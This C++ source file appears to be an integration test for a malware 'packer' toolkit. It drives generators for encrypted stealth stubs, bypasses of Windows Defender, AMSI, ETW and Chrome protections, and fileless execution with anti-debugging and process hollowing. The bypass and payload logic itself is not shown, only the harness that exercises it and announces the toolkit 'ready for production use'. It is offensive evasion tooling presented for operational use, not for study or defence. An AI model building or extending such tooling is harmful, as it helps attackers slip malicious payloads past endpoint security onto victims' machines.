#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <cstdio>
#include <chrono>
#include "stealth_triple_encryption.h"
#include "enhanced_bypass_generator.h"
#include "fileless_execution_generator.h"

int main() {
    try {
        std::cout << "=== Comprehensive Integration Test ===" << std::endl;
        std::cout << "Testing all integrated features together\n" << std::endl;
        
        // Test 1: StealthTripleEncryption
        std::cout << "1. Testing StealthTripleEncryption..." << std::endl;
        StealthTripleEncryption stealthEncryption;
        auto stealthKeys = stealthEncryption.generateKeys();
        std::vector<uint8_t> testPayload = {0x48, 0x65, 0x6C, 0x6C, 0x6F, 0x20, 0x57, 0x6F, 0x72, 0x6C, 0x64}; // "Hello World"
        auto encryptedPayload = stealthEncryption.applyEncryptionLayer(testPayload, stealthKeys[0]);
        std::string stealthStub = stealthEncryption.generateStealthStub(stealthKeys, encryptedPayload);
        std::cout << "   ✓ Generated stealth stub (" << stealthStub.length() << " chars)" << std::endl;
        
        // Test 2: EnhancedBypassGenerator
        std::cout << "\n2. Testing EnhancedBypassGenerator..." << std::endl;
        EnhancedBypassGenerator bypassGenerator;
        EnhancedBypassGenerator::BypassConfig bypassConfig;
        bypassConfig.windowsDefender = true;
        bypassConfig.amsi = true;
        bypassConfig.etw = true;
        bypassConfig.chrome = true;
        std::string bypassStub = bypassGenerator.generateFullBypassStub(bypassConfig);
        std::cout << "   ✓ Generated bypass stub (" << bypassStub.length() << " chars)" << std::endl;
        
        // Test 3: FilelessExecutionGenerator
        std::cout << "\n3. Testing FilelessExecutionGenerator..." << std::endl;
        FilelessExecutionGenerator filelessGenerator;
        FilelessExecutionGenerator::FilelessConfig filelessConfig;
        filelessConfig.antiDebug = true;
        filelessConfig.randomDelays = true;
        filelessConfig.memoryProtection = true;
        filelessConfig.multiLayerEncryption = true;
        std::string filelessStub = filelessGenerator.generateFilelessStub(testPayload, filelessConfig);
        std::cout << "   ✓ Generated fileless stub (" << filelessStub.length() << " chars)" << std::endl;
        
        // Test 4: Cross-feature compatibility
        std::cout << "\n4. Testing cross-feature compatibility..." << std::endl;
        
        // Verify all stubs are valid C++ by checking basic structure
        bool stealthValid = stealthStub.find("#include") != std::string::npos && 
                           stealthStub.find("int main") != std::string::npos;
        bool bypassValid = bypassStub.find("#include") != std::string::npos && 
                          bypassStub.find("WinMain") != std::string::npos;
        bool filelessValid = filelessStub.find("#include") != std::string::npos && 
                            filelessStub.find("main") != std::string::npos;
        
        std::cout << "   ✓ Stealth stub structure: " << (stealthValid ? "Valid" : "Invalid") << std::endl;
        std::cout << "   ✓ Bypass stub structure: " << (bypassValid ? "Valid" : "Invalid") << std::endl;
        std::cout << "   ✓ Fileless stub structure: " << (filelessValid ? "Valid" : "Invalid") << std::endl;
        
        // Test 5: Function name validation
        std::cout << "\n5. Testing function name validation..." << std::endl;
        auto functionNames = bypassGenerator.getFunctionNames();
        bool allNamesValid = true;
        int validNameCount = 0;
        
        for (const auto& name : {functionNames.amsiBypasser, functionNames.etwBypasser, 
                                functionNames.debuggerHelper, functionNames.processHollower}) {
            if (!name.empty()) {
                bool validName = std::isalpha(name[0]);
                if (validName) validNameCount++;
                else allNamesValid = false;
            }
        }
        
        std::cout << "   ✓ Valid function names: " << validNameCount << std::endl;
        std::cout << "   ✓ All names valid: " << (allNamesValid ? "Yes" : "No") << std::endl;
        
        // Test 6: Memory usage and performance
        std::cout << "\n6. Testing performance characteristics..." << std::endl;
        auto start = std::chrono::high_resolution_clock::now();
        
        // Generate multiple stubs to test performance
        for (int i = 0; i < 5; i++) {
            stealthEncryption.generateKeys();
            bypassGenerator.generateWindowsDefenderBypass();
            filelessGenerator.generateTestPayload();
        }
        
        auto end = std::chrono::high_resolution_clock::now();
        auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);
        std::cout << "   ✓ Generated 5 sets of components in " << duration.count() << "ms" << std::endl;
        
        // Test 7: File output capabilities
        std::cout << "\n7. Testing file output capabilities..." << std::endl;
        
        // Write test stubs to files
        std::ofstream stealthFile("test_stealth_output.cpp");
        if (stealthFile.is_open()) {
            stealthFile << stealthStub;
            stealthFile.close();
            std::cout << "   ✓ Stealth stub written to file" << std::endl;
        }
        
        std::ofstream bypassFile("test_bypass_output.cpp");
        if (bypassFile.is_open()) {
            bypassFile << bypassStub;
            bypassFile.close();
            std::cout << "   ✓ Bypass stub written to file" << std::endl;
        }
        
        std::ofstream filelessFile("test_fileless_output.cpp");
        if (filelessFile.is_open()) {
            filelessFile << filelessStub;
            filelessFile.close();
            std::cout << "   ✓ Fileless stub written to file" << std::endl;
        }
        
        // Test 8: Integration summary
        std::cout << "\n8. Integration Summary:" << std::endl;
        std::cout << "   ✓ StealthTripleEncryption: " << stealthKeys.size() << " encryption layers" << std::endl;
        std::cout << "   ✓ EnhancedBypassGenerator: " << validNameCount << " bypass functions" << std::endl;
        std::cout << "   ✓ FilelessExecutionGenerator: Advanced evasion features" << std::endl;
        std::cout << "   ✓ All components working independently" << std::endl;
        std::cout << "   ✓ Ready for GUI integration" << std::endl;
        
        // Clean up test files
        std::remove("test_stealth_output.cpp");
        std::remove("test_bypass_output.cpp");
        std::remove("test_fileless_output.cpp");
        
        std::cout << "\n✅ All integration tests passed!" << std::endl;
        std::cout << "🚀 Ready for production use in VS2022_GUI_Benign_Packer" << std::endl;
        
        return 0;
        
    } catch (const std::exception& e) {
        std::cerr << "\n❌ Integration test failed: " << e.what() << std::endl;
        return 1;
    }
}